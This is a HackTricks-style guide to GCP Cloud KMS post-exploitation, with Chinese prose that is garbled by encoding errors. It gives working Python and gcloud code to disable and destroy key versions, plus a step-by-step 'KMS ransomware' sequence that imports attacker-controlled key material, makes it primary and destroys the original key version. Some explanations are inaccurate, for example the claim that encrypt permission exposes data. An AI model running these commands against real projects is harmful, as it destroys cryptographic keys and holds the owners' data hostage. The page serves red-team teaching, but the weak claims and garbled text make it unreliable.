# GCP - KMS Post Exploitation

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

## KMS

åœ¨ä»¥ä¸‹é“¾æ¥ä¸­æŸ¥æ‰¾æœ‰å…³ KMS çš„åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="../gcp-services/gcp-kms-enum.md" %}
[gcp-kms-enum.md](../gcp-services/gcp-kms-enum.md)
{% endcontent-ref %}

### `cloudkms.cryptoKeyVersions.destroy`

å…·æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥é”€æ¯ KMS ç‰ˆæœ¬ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œé¦–å…ˆéœ€è¦ç¦ç”¨å¯†é’¥ï¼Œç„¶åé”€æ¯å®ƒï¼š
```python
# pip install google-cloud-kms

from google.cloud import kms

def disable_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Disables a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to disable the key version.
client.update_crypto_key_version(request={'crypto_key_version': {'name': key_version_name, 'state': kms.CryptoKeyVersion.State.DISABLED}})

def destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Destroys a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to destroy the key version.
client.destroy_crypto_key_version(request={'name': key_version_name})

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'  # Version number to disable and destroy

# Disable the key version
disable_key_version(project_id, location_id, key_ring_id, key_id, key_version)

# Destroy the key version
destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version)
```
### KMS Ransomware

åœ¨ AWS ä¸­ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ KMS èµ„æºç­–ç•¥å¹¶ä»…å…è®¸æ”»å‡»è€…è´¦æˆ·ä½¿ç”¨å¯†é’¥æ¥å®Œå…¨**çªƒå– KMS å¯†é’¥**ã€‚ç”±äºè¿™äº›èµ„æºç­–ç•¥åœ¨ GCP ä¸­ä¸å­˜åœ¨ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚

ç„¶è€Œï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•å¯ä»¥æ‰§è¡Œå…¨å±€ KMS Ransomwareï¼Œè¿™æ¶‰åŠä»¥ä¸‹æ­¥éª¤ï¼š

* åˆ›å»ºä¸€ä¸ªç”±æ”»å‡»è€…å¯¼å…¥çš„**å¯†é’¥ææ–™çš„æ–°ç‰ˆæœ¬å¯†é’¥**

{% code overflow="wrap" %}
```bash
gcloud kms import-jobs create [IMPORT_JOB] --location [LOCATION] --keyring [KEY_RING] --import-method [IMPORT_METHOD] --protection-level [PROTECTION_LEVEL] --target-key [KEY]
```
{% endcode %}

* å°†å…¶è®¾ç½®ä¸º**é»˜è®¤ç‰ˆæœ¬**ï¼ˆç”¨äºå°†æ¥åŠ å¯†çš„æ•°æ®ï¼‰
* ä½¿ç”¨æ–°ç‰ˆæœ¬**é‡æ–°åŠ å¯†**ç”¨å…ˆå‰ç‰ˆæœ¬åŠ å¯†çš„æ—§æ•°æ®ã€‚
* **åˆ é™¤ KMS å¯†é’¥**
* ç°åœ¨åªæœ‰æ‹¥æœ‰åŸå§‹å¯†é’¥ææ–™çš„æ”»å‡»è€…æ‰èƒ½è§£å¯†åŠ å¯†çš„æ•°æ®

#### ä»¥ä¸‹æ˜¯å¯¼å…¥æ–°ç‰ˆæœ¬å¹¶ç¦ç”¨/åˆ é™¤æ—§æ•°æ®çš„æ­¥éª¤ï¼š
```bash
# Encrypt something with the original key
echo "This is a sample text to encrypt" > /tmp/my-plaintext-file.txt
gcloud kms encrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--plaintext-file my-plaintext-file.txt \
--ciphertext-file my-encrypted-file.enc

# Decrypt it
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -


# Create an Import Job
gcloud kms import-jobs create my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--import-method "rsa-oaep-3072-sha1-aes-256" \
--protection-level "software"

# Generate key material
openssl rand -out my-key-material.bin 32

# Import the Key Material (it's encrypted with an asymetrict key of the import job previous to be sent)
gcloud kms keys versions import \
--import-job my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--algorithm "google-symmetric-encryption" \
--target-key-file my-key-material.bin

# Get versions
gcloud kms keys versions list \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key

# Make new version primary
gcloud kms keys update \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--primary-version 2

# Try to decrypt again (error)
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -

# Disable initial version
gcloud kms keys versions disable \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key 1

# Destroy the old version
gcloud kms keys versions destroy \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--version 1

```
### `cloudkms.cryptoKeyVersions.useToEncrypt` | `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation`

è¿™äº›æƒé™å…è®¸æ”»å‡»è€…ä½¿ç”¨ç°æœ‰çš„å¯†é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚è™½ç„¶è¿™ä¸ä¼šç›´æ¥æ³„éœ²å¯†é’¥çš„å†…å®¹ï¼Œä½†å®ƒå¯ä»¥è¢«ç”¨æ¥åŠ å¯†æ•æ„Ÿæ•°æ®ï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½å¤Ÿè®¿é—®è¿™äº›æ•°æ®ã€‚

### `cloudkms.cryptoKeyVersions.useToDecrypt` | `cloudkms.cryptoKeyVersions.useToDecryptViaDelegation`

è¿™äº›æƒé™å…è®¸æ”»å‡»è€…ä½¿ç”¨ç°æœ‰çš„å¯†é’¥å¯¹æ•°æ®è¿›è¡Œè§£å¯†ã€‚è¿™æ˜¯ä¸€ä¸ªæ›´ä¸¥é‡çš„æƒé™æ³„éœ²ï¼Œå› ä¸ºå®ƒå…è®¸æ”»å‡»è€…è§£å¯†ä»»ä½•ä½¿ç”¨è¯¥å¯†é’¥åŠ å¯†çš„æ•°æ®ï¼Œä»è€Œè®¿é—®æ•æ„Ÿä¿¡æ¯ã€‚

### `cloudkms.cryptoKeyVersions.viewPublicKey`

æ­¤æƒé™å…è®¸æ”»å‡»è€…æŸ¥çœ‹éå¯¹ç§°å¯†é’¥çš„å…¬é’¥ã€‚è™½ç„¶å…¬é’¥æœ¬èº«ä¸æ˜¯æ•æ„Ÿä¿¡æ¯ï¼Œä½†å®ƒå¯ä»¥è¢«ç”¨æ¥è¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ï¼Œä¾‹å¦‚ä¸­é—´äººæ”»å‡»ã€‚

### `cloudkms.keyRings.get` | `cloudkms.keyRings.list`

è¿™äº›æƒé™å…è®¸æ”»å‡»è€…æŸ¥çœ‹å¯†é’¥ç¯çš„è¯¦ç»†ä¿¡æ¯å’Œåˆ—å‡ºæ‰€æœ‰çš„å¯†é’¥ç¯ã€‚è™½ç„¶è¿™ä¸ä¼šç›´æ¥æ³„éœ²å¯†é’¥çš„å†…å®¹ï¼Œä½†å®ƒå¯ä»¥å¸®åŠ©æ”»å‡»è€…äº†è§£ç¯å¢ƒä¸­çš„å¯†é’¥ç®¡ç†ç»“æ„ï¼Œä»è€Œç­–åˆ’è¿›ä¸€æ­¥çš„æ”»å‡»ã€‚

### `cloudkms.cryptoKeys.get` | `cloudkms.cryptoKeys.list`

è¿™äº›æƒé™å…è®¸æ”»å‡»è€…æŸ¥çœ‹å¯†é’¥çš„è¯¦ç»†ä¿¡æ¯å’Œåˆ—å‡ºæ‰€æœ‰çš„å¯†é’¥ã€‚è™½ç„¶è¿™ä¸ä¼šç›´æ¥æ³„éœ²å¯†é’¥çš„å†…å®¹ï¼Œä½†å®ƒå¯ä»¥å¸®åŠ©æ”»å‡»è€…äº†è§£ç¯å¢ƒä¸­çš„å¯†é’¥ç®¡ç†ç»“æ„ï¼Œä»è€Œç­–åˆ’è¿›ä¸€æ­¥çš„æ”»å‡»ã€‚
```python
from google.cloud import kms
import base64

def encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext):
"""
Encrypts data using a symmetric key from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key name.
key_name = client.crypto_key_path(project_id, location_id, key_ring_id, key_id)

# Convert the plaintext to bytes.
plaintext_bytes = plaintext.encode('utf-8')

# Call the API.
encrypt_response = client.encrypt(request={'name': key_name, 'plaintext': plaintext_bytes})
ciphertext = encrypt_response.ciphertext

# Optional: Encode the ciphertext to base64 for easier handling.
return base64.b64encode(ciphertext)

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
plaintext = 'your-data-to-encrypt'

ciphertext = encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext)
print('Ciphertext:', ciphertext)
```
### `cloudkms.cryptoKeyVersions.useToSign`

#### æƒé™

æ­¤æƒé™å…è®¸æ”»å‡»è€…ä½¿ç”¨å¯†é’¥è¿›è¡Œç­¾åæ“ä½œã€‚

#### æ»¥ç”¨

æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ­¤æƒé™å¯¹æ•°æ®è¿›è¡Œç­¾åï¼Œä»è€Œä¼ªé€ åˆæ³•çš„ç­¾åã€‚

#### æ£€æµ‹

ç›‘æ§å¯¹ç­¾åæ“ä½œçš„ä½¿ç”¨ï¼Œå°¤å…¶æ˜¯å¼‚å¸¸çš„ç­¾åæ´»åŠ¨ã€‚

#### ç¼“è§£

é™åˆ¶å¯¹ç­¾åæƒé™çš„è®¿é—®ï¼Œä»…æˆäºˆå¿…è¦çš„ç”¨æˆ·å’ŒæœåŠ¡è´¦æˆ·ã€‚
```python
import hashlib
from google.cloud import kms

def sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message):
"""
Sign a message using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Call the API to sign the digest.
sign_response = client.asymmetric_sign(name=key_version_name, digest=digest)
return sign_response.signature

# Example usage for signing
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'
message = 'your-message'

signature = sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message)
print('Signature:', signature)
```
### `cloudkms.cryptoKeyVersions.useToVerify`

#### æƒé™

- `cloudkms.cryptoKeyVersions.useToVerify`

#### æè¿°

æ­¤æƒé™å…è®¸æ”»å‡»è€…ä½¿ç”¨æŒ‡å®šçš„å¯†é’¥ç‰ˆæœ¬æ¥éªŒè¯ç­¾åã€‚

#### åˆ©ç”¨

```bash
gcloud kms keys versions verify \
    --project <project-id> \
    --location <location> \
    --keyring <keyring-name> \
    --key <key-name> \
    --version <key-version> \
    --input-file <input-file> \
    --signature-file <signature-file> \
    --algorithm <algorithm>
```

#### ç¼“è§£æªæ–½

- é™åˆ¶å¯¹ `cloudkms.cryptoKeyVersions.useToVerify` æƒé™çš„è®¿é—®ã€‚
```python
from google.cloud import kms
import hashlib

def verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature):
"""
Verify a signature using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Build the verify request and call the API.
verify_response = client.asymmetric_verify(name=key_version_name, digest=digest, signature=signature)
return verify_response.success

# Example usage for verification
verified = verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature)
print('Verified:', verified)
```
{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}
